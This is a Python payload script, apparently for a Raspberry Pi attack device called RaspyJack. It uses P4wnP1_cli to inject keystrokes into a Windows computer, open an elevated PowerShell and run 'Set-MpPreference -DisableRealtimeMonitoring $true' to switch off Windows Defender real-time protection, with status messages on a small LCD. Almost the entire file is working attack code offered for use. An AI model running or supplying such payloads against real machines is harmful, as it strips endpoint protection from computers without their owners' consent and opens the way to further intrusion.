#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Disable Windows Defender**
================================================================
A HID attack that opens an elevated PowerShell prompt on Windows and
attempts to disable Windows Defender real-time protection.

**NOTE:** This requires the user to accept the UAC prompt. The command
may also be blocked by Defender's Tamper Protection.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- Display Functions ---
def show_message(lines):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill="lime")
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Disable Defender"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # PowerShell command to disable real-time monitoring
    ps_command = "Set-MpPreference -DisableRealtimeMonitoring $true"
    
    # DuckyScript to open an elevated PowerShell
    script = f"""
GUI x
delay(500)
press("a")
delay(1500)
type("{ps_command}")
delay(200)
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!", "Disable Defender"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
